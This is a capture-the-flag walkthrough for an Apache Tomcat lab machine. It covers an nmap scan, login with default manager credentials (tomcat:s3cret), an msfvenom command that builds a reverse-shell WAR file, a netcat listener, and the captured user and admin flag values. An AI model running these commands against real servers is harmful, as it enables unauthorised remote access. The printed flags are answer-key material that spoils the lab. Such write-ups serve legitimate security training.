@@ -1,0 +1,40 @@
+First, we do Nmap scan on the target IP: nmap -v -o -p- {target ip} . This will scan all of the ports while telling us more about the operating system that this ip address belongs to.
+
+Our scan will come up with a tcp port 8080. That means there is a website hosted.
+
+To visit this website, we will search for: {target ip}:8080 in the URL search bar. 
+
+It seams like we have a website that is running on a webserver called Apache Tomcat. 
+
+We will give ourselves sometime to get familiar with the structure of the website. Eventually, we will find a manager page that requires a sing in using username and password. Now, it is time to use BurpSuite.
+
+Unfortunately, BurpSuite can't capture popups so we can't use BurpSuite to brute force the credentials.
+
+That means we have to do that manually, but first we need a set of credentials that might be the right credentials, so we search for default credentials for Apache Tomcat. 
+
+Luckily, we stumble upon this Github repo: https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown 
+
+This repo contains possible default credentials. After trying multiple of them, we get the right set of credentials: tomcat:s3cret
+
+We notice that we have the ability to upload a war file which is a packaged web application that contains files for a web application and is similar to a ZIP or JAR file.
+
+Now, We will search across the internet for what we should do next. We once again stumble upon a great article in HackTricks about how to obtain a reverse shell for Apache Tomcat server. We will be using msfvenom to build a war file for us that we can upload to the webserver. 
+
+we will use msfvenom like so:msfvenom -p java/jsp_shell_reverse_tcp LHOST={our ip address} LPORT={any port we want} -f war -o revshell.war . This will save the payload to a file called revshell.war which we will upload.
+
+Before uploading the file, we need to start netcat listening on the port that we specified earlier: nc -nvlp {port number}. Then we will upload our .war file. 
+
+We will notice that we have a new option to click on in the webserver:/revshell.war which will activate our payload upon clicking on it.
+
+Now, if we went back to netcat, we can see that we now have a reverse shell to the target machine.
+
+If we typed whoami, we will find out that we are already admin, so no priv-esc is required for this machine.
+
+If we go to Users/Administrator/flags, we can find the text file that has both flags for the solution. 
+
+To read the text file: type "name of file" .
+
+user flag: 7004dbcef0f854e0fb401875f26ebd00
+
+admin flag: 04a8b36e1545a455393d067e772fe90e
+
